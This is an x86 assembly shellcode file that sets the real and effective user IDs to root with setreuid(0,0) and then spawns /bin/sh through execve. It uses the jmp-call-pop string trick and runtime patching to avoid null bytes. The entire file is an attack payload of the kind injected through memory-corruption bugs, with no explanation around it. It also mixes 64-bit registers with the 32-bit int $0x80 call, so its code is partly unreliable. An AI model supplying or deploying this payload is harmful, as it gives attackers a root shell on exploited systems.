.section .data
.section .text
.globl _start

jmp put_addr_on_stack

_start: # setreuid( 0, 0 ) --- run as root
    xor %rax, %rax
    mov $70, %al
    xor %rbx, %rbx
    xor %rcx, %rcx
    int $0x80
    jmp put_addr_on_stack

prep_string:
    pop %rbx
    xor %rax, %rax
    mov %al, 0x07(%rbx)  # N -> \0
    mov %rbx, 0x08(%rbx) # write addr to mem
    mov %rax, 0x10(%rbx) # write null to mem

call_execve: # execve( "/bin/sh", NULL, NULL )
    mov $0xff, %al
    sub $0xf4, %al
    lea 0x08(%rbx), %rcx
    lea 0x10(%rbx), %rdx
    int $0x80

put_addr_on_stack:
    call prep_string # this call puts the addr of string on stack
    .string "/bin/shNAAAAAAAABBBBBBBB"
